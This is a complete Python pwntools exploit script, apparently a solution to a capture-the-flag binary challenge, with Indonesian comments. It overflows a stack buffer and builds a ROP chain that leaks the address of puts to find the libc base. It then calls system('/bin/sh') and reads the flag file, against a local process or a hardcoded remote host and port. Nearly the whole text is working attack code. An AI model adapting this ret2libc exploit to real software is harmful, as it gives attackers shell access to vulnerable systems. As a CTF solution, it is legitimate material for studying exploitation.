#!/usr/bin/env python3

from pathlib import Path
import time
from pwn import *

BASE_DIR = Path(__file__).resolve().parent
BINARY_PATH = BASE_DIR / "chall"
LIBC_PATH = BASE_DIR / "libc.so.6"

context.binary = elf = ELF(str(BINARY_PATH), checksec=False)
libc = ELF(str(LIBC_PATH), checksec=False)
context.arch = "amd64"
context.log_level = "info"

OFFSET = 0x58
POP_RDI = 0x4011ED
RET = 0x40101A
MAIN = 0x401090
PUTS_PLT = 0x401060


def start():
    if args.REMOTE:
        host = args.HOST or "35.192.106.100"
        port = int(args.PORT or 20002)
        return remote(host, port)
    if args.GDB:
        return gdb.debug(
            [str(BINARY_PATH)],
            env={"LD_LIBRARY_PATH": str(BASE_DIR)},
            gdbscript="set pagination off\nbreak *0x4010dd\ncontinue",
        )
    return process([str(BINARY_PATH)], env={"LD_LIBRARY_PATH": str(BASE_DIR)})


def exploit(io):
    io.recvuntil(b"\n")

    # Stage 1: puts(puts@GOT), lalu kembali ke fungsi input utama.
    stage1 = flat(
        b"A" * OFFSET,
        POP_RDI,
        elf.got["puts"],
        PUTS_PLT,
        MAIN,
    )
    io.send(stage1)

    leak_line = io.recvline(timeout=3)
    if not leak_line:
        raise RuntimeError("gagal menerima output leak")
    leak = u64(leak_line.rstrip(b"\n").ljust(8, b"\0"))
    if leak & 0xfff != libc.sym["puts"] & 0xfff:
        raise RuntimeError(f"leak puts tidak valid: {leak:#x}")
    libc.address = leak - libc.sym["puts"]
    log.success(f"puts leak: {leak:#x}")
    log.success(f"libc base: {libc.address:#x}")

    # Sinkronisasi dengan banner dari pemanggilan main kedua.
    io.recvuntil(b"\n")

    # Stage 2: system("/bin/sh"). RET menjaga alignment stack untuk libc.
    stage2 = flat(
        b"B" * OFFSET,
        RET,
        POP_RDI,
        next(libc.search(b"/bin/sh\0")),
        libc.sym["system"],
    )
    io.send(stage2)


def main():
    io = start()
    exploit(io)
    # Sinkronisasi mencegah command ikut terbaca oleh read() tahap kedua.
    time.sleep(1.0)
    io.sendline(b"cat /home/ctf/flag.txt")
    if args.REMOTE:
        result = io.recvrepeat(2)
        if result:
            print(result.decode(errors="replace"), end="")
    io.interactive()


if __name__ == "__main__":
    main()
